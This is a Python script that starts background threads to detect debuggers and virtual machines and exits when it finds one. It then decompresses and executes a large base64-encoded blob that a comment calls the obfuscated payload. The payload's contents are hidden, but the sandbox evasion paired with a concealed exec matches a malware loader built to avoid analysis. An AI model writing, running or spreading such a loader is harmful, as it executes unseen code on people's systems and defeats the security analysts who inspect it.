
import zlib, base64, marshal, sys, os, random, time, threading, ctypes

# Anti-debug

# ============ ANTI-DEBUG ============
import ctypes, sys, os, time, threading

def check_debugger():
    try:
        if os.name == 'nt':
            import win32api
            if win32api.IsDebuggerPresent():
                return True
            kernel32 = ctypes.windll.kernel32
            if kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
                return True
        start = time.time()
        for _ in range(1000000):
            pass
        if time.time() - start < 0.01:
            return True
        return False
    except:
        return False

def anti_debug_loop():
    while True:
        if check_debugger():
            try:
                ctypes.windll.kernel32.RaiseException(0x80000000, 0, 0, None)
            except:
                os._exit(1)
        time.sleep(1)

threading.Thread(target=anti_debug_loop, daemon=True).start()


# Anti-VM

# ============ ANTI-VM ============
import subprocess, re, time, threading

def check_vm():
    vm_indicators = ['VMware', 'VirtualBox', 'VBox', 'QEMU', 'KVM', 'Xen', 'vbox', 'qemu', 'hyper-v', 'docker']
    try:
        if os.name == 'nt':
            processes = subprocess.check_output('tasklist', shell=True).decode().lower()
            for indicator in vm_indicators:
                if indicator.lower() in processes:
                    return True
        else:
            processes = subprocess.check_output('ps aux', shell=True).decode().lower()
            for indicator in vm_indicators:
                if indicator.lower() in processes:
                    return True
    except:
        pass
    try:
        if os.name == 'nt':
            import wmi
            c = wmi.WMI()
            for item in c.Win32_ComputerSystem():
                if item.Manufacturer and ('VMware' in item.Manufacturer or 'VirtualBox' in item.Manufacturer):
                    return True
    except:
        pass
    return False

def anti_vm_loop():
    while True:
        if check_vm():
            os._exit(1)
        time.sleep(5)

threading.Thread(target=anti_vm_loop, daemon=True).start()


# Esegue il payload offuscato
exec(zlib.decompress(base64.b64decode("""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""")))
